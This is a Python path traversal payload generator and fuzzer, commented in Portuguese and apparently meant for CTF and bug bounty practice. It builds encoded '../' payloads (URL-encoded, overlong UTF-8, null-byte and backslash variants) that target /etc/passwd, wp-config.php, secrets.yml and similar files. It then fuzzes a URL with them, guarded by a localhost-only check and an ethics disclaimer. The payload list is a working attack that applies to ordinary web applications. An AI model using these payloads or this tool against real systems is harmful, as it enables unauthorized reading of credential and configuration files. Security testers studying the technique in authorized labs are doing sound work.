#!/usr/bin/env python3
"""
Path Traversal PAYLOAD GENERATOR + LOCAL-ONLY TESTER
---------------------------------------------------
Uso:
  - Para gerar payloads (arquivo): rodar com --gen
  - Para testar contra um servidor local (localhost): rodar com --test http://127.0.0.1:5000/view?file=FUZZ
  - Para ambos: --gen --test ...

AVISO LEGAL E ÉTICA:
  - Este script NÃO deve ser usado contra alvos remotos ou sem autorização expressa.
  - O modo de teste só permitirá hosts locais (localhost, 127.0.0.1, ::1).
  - Você é responsável pelo uso. Esse código é entregue para fins educativos, teste em ambiente controlado
    e preparação para bug bounty em alvos onde você tem permissão escrita.
"""

import argparse
import os
import sys
import time
import socket
import csv
from urllib.parse import urlparse, quote
import itertools
import requests

# -------------------------
# Configurações padrão
# -------------------------
DEFAULT_PAYLOAD_FILE = "payloads_path_traversal.txt"
DEFAULT_RESULT_FILE = "results_local_test.csv"
DEFAULT_MAX_DEPTH = 8           # profundidade máxima de ../ a testar no gerador
DEFAULT_PATTERNS = ["../", "..%2f", "..%5c", "..\\/"]  # variações e encodings comuns
DEFAULT_FILENAMES = [
    "flag.txt", "flag", "FLAG", "flag1.txt", "flag_1.txt",
    "/etc/passwd", "passwd", "/etc/hosts", "web.config", "config.php",
    "wp-config.php", "database.yml", "secrets.yml"
]
REQUEST_TIMEOUT = 8.0           # timeout para requests no modo local
RATE_LIMIT_SECONDS = 0.2        # intervalo entre requisições no modo teste local

# -------------------------
# Helpers - verificação de host local
# -------------------------
def is_host_local(url):
    """
    Verifica se o hostname do URL resolve para localhost / 127.0.0.1 / ::1.
    Retorna True somente para hosts locais.
    """
    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        return False
    # Hostnames que diretamente representam localhost
    if host in ("localhost", "127.0.0.1", "::1"):
        return True
    # Resolve e compara com laços conhecidos de localhost
    try:
        addrs = set()
        for res in socket.getaddrinfo(host, None):
            addrs.add(res[4][0])
        if addrs & {"127.0.0.1", "::1"}:
            return True
    except Exception:
        pass
    return False

# -------------------------
# Gerador de payloads
# -------------------------
def generate_payloads(out_path=DEFAULT_PAYLOAD_FILE,
                      max_depth=DEFAULT_MAX_DEPTH,
                      patterns=None,
                      filenames=None):
    """
    Gera uma lista de payloads path traversal e salva em out_path.
    O arquivo é sobrescrito se já existir.
    """
    patterns = patterns or DEFAULT_PATTERNS
    filenames = filenames or DEFAULT_FILENAMES

    payloads = []

    # 1) variação por profundidade + filename
    for depth in range(1, max_depth + 1):
        for p in patterns:
            prefix = p * depth
            for f in filenames:
                payloads.append(prefix + f)
                # tentativa com /var/www/html prefix comum
                payloads.append(prefix + "var/www/html/" + f.lstrip("/"))

    # 2) variações com url-encoding parcial/total das sequências "../"
    encodings = {
        "../": ["../", "%2e%2e%2f", "%2e%2e/", "..%252f", "..%c0%af", "..%c0%af"],
        "/": ["/", "%2f", "%2F"]
    }
    # combine algumas variações simples
    for depth in range(1, max_depth + 1):
        # repeat encoded "../" different ways
        for enc in encodings["../"]:
            prefix = enc * depth
            for f in filenames:
                payloads.append(prefix + f)

    # 3) Null byte injection attempts (para servidores antigos que interpretam)
    for depth in range(1, max_depth + 1):
        prefix = "../" * depth
        for f in filenames:
            payloads.append(prefix + f + "%00")
            payloads.append(prefix + f + "%00.txt")

    # 4) Windows backslash attempts
    for depth in range(1, max_depth + 1):
        prefix = "..\\" * depth
        for f in filenames:
            payloads.append(prefix + f)

    # 5) remove duplicates mantendo ordem
    seen = set()
    final = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            final.append(p)

    # escreve em arquivo
    with open(out_path, "w", encoding="utf-8") as fh:
        for p in final:
            fh.write(p + "\n")

    print(f"[+] Gerados {len(final)} payloads em: {out_path}")
    return out_path, final

# -------------------------
# Testador local (só localhost)
# -------------------------
def run_local_test(target_template, payloads, result_file=DEFAULT_RESULT_FILE,
                   rate_limit=RATE_LIMIT_SECONDS, timeout=REQUEST_TIMEOUT,
                   additional_headers=None, match_strings=None):
    """
    Envia requests substituindo 'FUZZ' no target_template com cada payload.
    Só permite executar se o host do target_template for local.
    Salva resultados básicos em CSV.
    """
    parsed = urlparse(target_template)
    if not is_host_local(target_template):
        print("[!] ABORTANDO: alvo não é localhost/127.0.0.1/::1. Este modo só permite testes locais.")
        return

    # prepara CSV de resultados
    with open(result_file, "w", newline="", encoding="utf-8") as csvfile:
        fieldnames = ["payload", "http_status", "content_length", "matched_strings", "url"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()

        session = requests.Session()
        headers = {
            "User-Agent": "LocalPathTraversalTester/1.0 (+educational use)",
            "Accept": "*/*"
        }
        if additional_headers:
            headers.update(additional_headers)

        print(f"[+] Iniciando testes locais em {target_template} (payloads: {len(payloads)})")
        for idx, p in enumerate(payloads, 1):
            # substitui marcador FUZZ no template; se FUZZ não existir, tenta anexar como parâmetro 'file='
            if "FUZZ" in target_template:
                url = target_template.replace("FUZZ", quote(p, safe=""))
            else:
                # tenta adicionar como ?file=
                sep = "&" if urlparse(target_template).query else "?"
                url = f"{target_template}{sep}file={quote(p, safe='')}"

            try:
                r = session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                content = r.text or ""
                matched = []
                if match_strings:
                    for s in match_strings:
                        if s in content:
                            matched.append(s)
                # heurística simples para conteúdo provavelmente sensível
                heuristics = []
                if "root:" in content:
                    heuristics.append("contains_root_colon")
                if "FLAG" in content or "flag{" in content or "ctf{" in content:
                    heuristics.append("possible_flag")
                if r.status_code == 200 and len(content) > 1000:
                    heuristics.append("large_200_ok")

                matched_all = matched + heuristics

                writer.writerow({
                    "payload": p,
                    "http_status": r.status_code,
                    "content_length": len(content),
                    "matched_strings": ";".join(matched_all),
                    "url": url
                })
                print(f"[{idx}/{len(payloads)}] {r.status_code} {len(content)} bytes - {p} - matches: {matched_all}")
            except requests.RequestException as e:
                # registra erro simples
                writer.writerow({
                    "payload": p,
                    "http_status": "ERR",
                    "content_length": 0,
                    "matched_strings": f"error:{str(e)}",
                    "url": url
                })
                print(f"[{idx}/{len(payloads)}] ERRO - {p} - {e}")

            time.sleep(rate_limit)

    print(f"[+] Teste local concluído. Resultados em: {result_file}")

# -------------------------
# CLI
# -------------------------
def main():
    parser = argparse.ArgumentParser(description="Payload generator + local-only tester (path traversal).")
    parser.add_argument("--gen", action="store_true", help="Gerar payloads para arquivo.")
    parser.add_argument("--payload-file", type=str, default=DEFAULT_PAYLOAD_FILE, help="Arquivo de saída/entrada de payloads.")
    parser.add_argument("--max-depth", type=int, default=DEFAULT_MAX_DEPTH, help="Profundidade máxima de traversal no gerador.")
    parser.add_argument("--test", type=str, metavar="TARGET_URL", help="URL alvo template. Use 'FUZZ' como placeholder para payload (ex: http://127.0.0.1:5000/view?file=FUZZ). Se omitir FUZZ, será anexado ?file=payload.")
    parser.add_argument("--results", type=str, default=DEFAULT_RESULT_FILE, help="Arquivo CSV para salvar resultados do teste local.")
    parser.add_argument("--rate", type=float, default=RATE_LIMIT_SECONDS, help="Rate limit entre requisições (segundos).")
    parser.add_argument("--timeout", type=float, default=REQUEST_TIMEOUT, help="Timeout requests (segundos).")
    parser.add_argument("--match", type=str, nargs="*", help="Strings a procurar nas respostas (ex: root: flag{).")
    parser.add_argument("--force-overwrite", action="store_true", help="Forçar sobrescrita do arquivo de payloads se existir.")
    args = parser.parse_args()

    # 1) Gerar payloads se pedido
    payloads = []
    if args.gen:
        if os.path.exists(args.payload_file) and not args.force_overwrite:
            print(f"[!] Arquivo {args.payload_file} já existe. Use --force-overwrite para sobrescrever ou apague o arquivo manualmente.")
            # carrega do arquivo existente para usar no teste se test também for pedido
            with open(args.payload_file, "r", encoding="utf-8") as fh:
                payloads = [line.strip() for line in fh if line.strip()]
            print(f"[i] Carregados {len(payloads)} payloads existentes de {args.payload_file}")
        else:
            _, payload_list = generate_payloads(out_path=args.payload_file, max_depth=args.max_depth)
            payloads = payload_list

    # 2) Se modo teste pedido
    if args.test:
        # se não geramos agora e existe payload_file, carregue
        if not payloads:
            if os.path.exists(args.payload_file):
                with open(args.payload_file, "r", encoding="utf-8") as fh:
                    payloads = [line.strip() for line in fh if line.strip()]
                print(f"[i] Carregados {len(payloads)} payloads de {args.payload_file}")
            else:
                print(f"[!] Nenhum payload disponível; gere com --gen ou forneça um arquivo válido.")
                sys.exit(1)

        # Verifique que target é localhost antes de enviar
        if not is_host_local(args.test):
            print("[!] Alvo de teste não é local. Abortando para impedir uso indevido.")
            sys.exit(1)

        # Executa o teste local
        run_local_test(args.test, payloads, result_file=args.results, rate_limit=args.rate, timeout=args.timeout, match_strings=args.match)

    if not args.gen and not args.test:
        parser.print_help()

if __name__ == "__main__":
    main()
